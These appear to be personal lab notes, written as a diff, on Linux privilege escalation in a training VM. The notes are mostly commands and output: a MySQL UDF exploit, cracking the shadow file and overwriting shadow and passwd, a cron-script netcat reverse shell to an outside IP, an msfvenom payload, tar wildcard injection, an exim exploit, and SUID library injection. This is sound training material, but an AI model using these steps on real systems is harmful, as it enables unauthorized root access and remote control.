@@ -1,0 +1,329 @@
+scape shell using mysql running as root with our withoud password
+
+
+user@debian:~/tools$ ls
+kernel-exploits  mysql-udf  nginx  privesc-scripts  sudo  suid
+user@debian:~/tools$ cd mysql-udf/
+user@debian:~/tools/mysql-udf$ ls
+raptor_udf2.c
+user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC
+user@debian:~/tools/mysql-udf$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+user@debian:~/tools/mysql-udf$ mysql -u root 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 37
+Server version: 5.1.73-1+deb6u1 (Debian)
+
+Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> select sys_exec('usermod -a -G admin robert');   
+ERROR 1305 (42000): FUNCTION sys_exec does not exist
+mysql> use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> create table foo(line blob);
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+Query OK, 1 row affected (0.00 sec)
+
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+Query OK, 1 row affected (0.00 sec)
+
+mysql> create function do_system return integer soname 'raptor_udf3.so';
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'return integer soname 'raptor_udf3.so'' at line 1
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
++------------------------------------------------------------------+
+| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
++------------------------------------------------------------------+
+|                                                                0 |
++------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> exit
+Bye
+user@debian:~/tools/mysql-udf$ /tmp/rootbash -p
+rootbash-4.1# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+
+
+hash crack of shadow file...
+
+
+
+ vim shadow_hash.txt                 
+Privesc_tcm: john shadow_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password123      (?)
+1g 0:00:00:00 DONE (2021-03-24 02:22) 1.162g/s 2381p/s 2381c/s 2381C/s kucing..lovers1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+Privesc_tcm: cat shadow_hash.txt               
+$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
+Privesc_tcm: hashid
+$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
+Analyzing '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0'
+[+] SHA-512 Crypt 
+
+
+if wirtable shadow....
+
+mkpasswd -m sha-512 saimson    //saimson is my password here....
+
+$6$4K5AXqERZRU$x0I5bd5I7L6yN6McbJ5LyhpaqtR1qnooE3seA5ARBCUY9ab.EajD7HlCQKNhP7jV3uv3XFlqLTYLvfYobytG21
+
+now we have the our genrated password.. we can paste in shadow in between both colons
+
+like this ...
+
+
+
+root:$6$4K5AXqERZRU$x0I5bd5I7L6yN6McbJ5LyhpaqtR1qnooE3seA5ARBCUY9ab.EajD7HlCQKNhP7jV3uv3XFlqLTYLvfYobytG21:17298:0:99999:7:::
+
+save the file and su root 
+
+user@debian:~/tools/mysql-udf$ su root
+Password: 
+root@debian:/home/user/tools/mysql-udf# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+if writable passwd...
+
+
+Privesc_tcm: openssl passwd saims0n
+sC68dJyvgTpSo
+Privesc_tcm: 
+
+And then paste the hash in passwd file in place of "x"
+
+root:sC68dJyvgTpSo:0:0:root:/root:/bin/bash
+
+then su root ...
+
+
+Writable cron script ....
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+user@debian:~/tools/sudo$ ls -lah /usr/local/bin/compress.sh 
+-rwxr--r-- 1 root staff 53 May 13  2017 /usr/local/bin/compress.sh
+user@debian:~/tools/sudo$ locate
+locate            locate.findutils  
+user@debian:~/tools/sudo$ locate overwrite.sh
+locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 312.5 days)
+/usr/local/bin/overwrite.sh
+user@debian:~/tools/sudo$ ls -lah /usr/local/bin/overwrite.sh 
+-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
+user@debian:~/tools/sudo$ vim /usr/local/bin/overwrite.sh 
+user@debian:~/tools/sudo$ cat /usr/local/bin/overwrite.sh 
+#!/bin/bash
+
+nc -e /bin/bash 10.8.5.14 1234
+
+echo `date` > /tmp/useless
+user@debian:~/tools/sudo$ 
+
+and start listener recieved shell...
+
+Privesc_tcm: nc -nlvp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.157.155 41236
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+Path variable with contab...
+
+user@debian:~/tools/sudo$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+so the PATH variable is assigned by our directory..if we create the same file name which is executing from /usr/local/bin/overwrite.sh then we can escalate our privilages...
+
+user@debian:~/tools/sudo$ vim /home/user/overwrite.sh
+
+with the content of ...
+
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+
+
+save and exit .. Make sure to give execute permission
+
+
+user@debian:~/tools/sudo$ chmod +x /home/user/overwrite.sh 
+
+user@debian:~/tools/sudo$ cd /tmp/
+user@debian:/tmp$ ls
+user@debian:/tmp$ ls
+user@debian:/tmp$ time
+
+real	0m0.000s
+user	0m0.000s
+sys	0m0.000s
+user@debian:/tmp$ date
+Tue Mar 23 18:00:42 EDT 2021
+user@debian:/tmp$ date
+Tue Mar 23 18:00:45 EDT 2021
+user@debian:/tmp$ ls
+user@debian:/tmp$ date
+Tue Mar 23 18:01:09 EDT 2021
+user@debian:/tmp$ ls
+backup.tar.gz  rootbash
+user@debian:/tmp$ ./rootbash -p
+rootbash-4.1# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+rootbash-4.1# exit
+
+
+
+Scape shell by utilizing wildcard in cron script...
+
+user@debian:/tmp$ cat /usr/local/bin/compress.sh 
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+
+The script is using * wildcard to  zip all in this dir..
+
+so let's take advantage of it.
+we can go with gtfobins for help,
+
+genrate the shell using msfvenome
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf 
+
+and transfer it to vuln mcn using wget curl or scp...
+
+and make sure to give execute permission..
+
+then create two files using this command..
+
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+
+
+
+user@debian:/tmp$ cp shell.elf /home/user/
+user@debian:/tmp$ cd /home/user/
+user@debian:~$ ls
+--checkpoint=1                      myvpn.ovpn    shell.elf
+--checkpoint-action=exec=shell.elf  overwrite.sh  tools
+user@debian:~$ chmod +x shell.elf 
+
+
+
+start listener nc -nlvp 4444
+
+you will get back root shell
+
+[privesc_notes] nc -nlvp 1234                                    3:39:40 
+Listening on 0.0.0.0 1234
+id
+Connection received on 10.10.157.155 41243
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+
+
+
+escaping with suid exploitbale binary...
+
+-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
+
+download the exploit..
+
+https://www.exploit-db.com/exploits/39535
+
+
+user@debian:~$ ./exploit.sh 
+[ CVE-2016-1531 local root exploit
+sh-4.1# id
+uid=0(root) gid=1000(user) groups=0(root)
+sh-4.1# 
+
+
+Suid-so exploiting to get root....
+
+
+
+
+The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
+
+First, execute the file and note that currently it displays a progress bar before exiting:
+
+/usr/local/bin/suid-so
+
+Run strace on the file and search the output for open/access calls and for "no such file" errors:
+
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+
+Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
+
+Create the .config directory for the libcalc.so file:
+
+mkdir /home/user/.config
+
+Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:
+
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+
+Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
+
+/usr/local/bin/suid-so
+
+user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+user@debian:~$ /usr/local/bin/suid-so
+Calculating something, please wait...
+bash-4.1# id
+uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+bash-4.1# 
+
+
+
+
+
